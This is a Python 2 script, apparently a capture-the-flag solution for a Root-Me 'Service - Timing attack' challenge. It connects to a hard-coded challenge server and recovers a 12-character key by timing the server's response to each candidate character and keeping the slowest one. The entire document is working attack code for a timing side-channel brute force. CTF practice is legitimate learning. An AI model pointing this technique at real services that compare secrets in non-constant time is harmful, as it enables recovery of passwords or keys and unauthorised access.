#!/usr/bin/env python

#Service - Timing attack
#Mimo-0xC001
#www.fb.com/0xC00l

import socket
import time

def getFlag():
 TCP_IP= '212.129.38.224'  #ip of challenge01.root-me.org
 TCP_PORT= 51015
 BUFFER_SIZE=1024
 
 print "[+]- Connecting To %s:%d\n" % (TCP_IP,TCP_PORT)
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((TCP_IP, TCP_PORT))
 data = s.recv(BUFFER_SIZE)
 print data
 
 chars="0123456789-"
 time_char=0
 char_found=''
 key=''
 
 for i in range(12):
  for c in chars:
   s.send(key+c)
   debut=time.time()
   data = s.recv(BUFFER_SIZE)
   fin=time.time()
   diff=fin-debut
   if(diff>time_char):
     time_char=diff
     char_found=c
  key+=char_found
  time_char=0
  print "[+] - key : " + key + "*"*(11-i)
 s.close()
 return key

def main():
 print "[+] - Flag is : %s\n" % (getFlag())

if __name__ == '__main__':
   main()